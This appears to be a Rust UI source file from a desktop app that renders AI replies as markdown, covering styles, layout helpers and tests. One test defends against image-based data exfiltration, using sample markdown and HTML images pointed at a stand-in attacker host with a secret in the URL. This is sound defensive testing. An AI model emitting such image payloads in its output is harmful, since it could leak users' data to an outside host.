/// How markdown reads in messages and pages (chat bubbles, coding threads, work results): headings a step or two above
/// the 16 px body rather than page-sized, and paragraphs a short gap apart. Code is drawn by our copy of
/// gpui-component (vendor/gpui-component/FILO.md). What it shows is a model's or a tool's text, so a picture at a web
/// address is a link rather than something the app fetches (`remote_pictures`: a reply could put what it found in that
/// address).
pub fn markdown_style() -> gpui_component::text::TextViewStyle {
    gpui_component::text::TextViewStyle::default()
        .remote_pictures(false)
        .paragraph_gap(gpui::rems(0.75))
        .heading_font_size(|level, _| {
            px(match level {
                1 => 20.,
                2 => 18.,
                _ => 16.,
            })
        })
}

/// `markdown_style` for a page of its own (a work result): headings a little larger, as on a document.
pub fn markdown_page_style() -> gpui_component::text::TextViewStyle {
    gpui_component::text::TextViewStyle::default().paragraph_gap(gpui::rems(0.875)).heading_font_size(|level, _| {
        px(match level {
            1 => 24.,
            2 => 20.,
            3 => 18.,
            _ => 16.,
        })
    })
}

/// Centred, width-capped page column used by most screens, in the pane right of the sidebar.
pub fn page_column() -> Div {
    page_column_in(content_width())
}

/// `page_column` in a pane `content` points wide (one without the sidebar beside it). A set width, not a full one
/// capped: Taffy measured a capped column as wide as its pane, where text wraps onto fewer lines, and kept that
/// shorter height, so the page's end ran past the column's and its scroll stopped short of the bottom. The column
/// still fits a narrower pane.
pub fn page_column_in(content: f32) -> Div {
    div().w(px(content.min(crate::theme::MAX_CONTENT_WIDTH))).max_w_full().mx_auto().px(px(crate::theme::PAGE_PADDING))
}

/// Keeps a multi-line input within `max` characters (gpui-component's
/// `validate` only works on single-line inputs). Call on `InputEvent::Change`.
pub fn cap_length(
    input: &gpui::Entity<gpui_component::input::InputState>,
    max: usize,
    window: &mut Window,
    cx: &mut App,
) {
    let value = input.read(cx).value();
    if value.chars().count() > max {
        let capped: String = value.chars().take(max).collect();
        input.update(cx, |input, cx| input.set_value(capped, window, cx));
    }
}

/// A Cover-fitted image filling its (relative) parent, really clipped and rounded.
/// GPUI draws Cover images at their scaled size, rounds those bounds and only clips
/// to rectangles, so a wide image spills out with square corners. This clips it to
/// the parent and hides the corners under a frame in `behind`, the colour the image
/// sits on. The frame reaches a little outside the parent, so the parent must not
/// clip (no `overflow_hidden`).
pub fn rounded_cover(source: impl Into<gpui::ImageSource>, radius: f32, behind: Hsla) -> Div {
    use gpui::{ObjectFit, StyledImage as _, img};
    let clipped = div()
        .absolute()
        .inset_0()
        .overflow_hidden()
        .child(img(crate::pictures::source(source)).size_full().object_fit(ObjectFit::Cover));
    let layer = div().absolute().inset_0().child(clipped);
    if radius <= 0. {
        return layer;
    }
    // Deep enough to cover a square corner: (√2 − 1) · radius, plus a pixel.
    let frame = (radius * 0.42).ceil() + 1.;
    layer.child(
        div()
            .absolute()
            .top(px(-frame))
            .left(px(-frame))
            .right(px(-frame))
            .bottom(px(-frame))
            .rounded(px(radius + frame))
            .border(px(frame))
            .border_color(behind),
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A reply's picture at a web address is a link the reader may click, never something the app fetches (security
    /// review M8): markdown or raw HTML. Pictures on this Mac still show, and the group's `mention:` links stay.
    #[test]
    fn messages_fetch_no_picture_from_the_web() {
        use gpui_component::text::safety::markdown_targets;
        let targets = |raw: &str| markdown_targets(raw, markdown_style());
        assert_eq!(
            targets("Done ![chart](https://attacker.example/?d=s3cr3t)"),
            ["link:https://attacker.example/?d=s3cr3t"]
        );
        assert_eq!(targets("![](//attacker.example/p.png)"), Vec::<String>::new());
        for raw in [
            "![x][a]\n\n[a]: https://attacker.example/r.png",
            "<img src=\"https://attacker.example/h.png\">",
            "Look: <img src='https://attacker.example/i.png'> here",
        ] {
            assert!(!targets(raw).iter().any(|target| target.starts_with("image:")), "{raw}: {:?}", targets(raw));
        }
        assert_eq!(targets("![after](/Users/me/proof/after.png)"), ["image:/Users/me/proof/after.png"]);
        assert_eq!(targets("[@Chef](mention:1/chef)"), ["link:mention:1/chef"]);
    }

    #[test]
    fn hidden_emails_keep_their_shape_and_nothing_else() {
        let hidden = stand_in("samriver@example.com");
        assert_eq!(hidden.chars().count(), "samriver@example.com".chars().count());
        assert_eq!(hidden.find('@'), Some(8));
        assert!(!hidden.contains("samriver") && !hidden.contains("example"));
    }
}
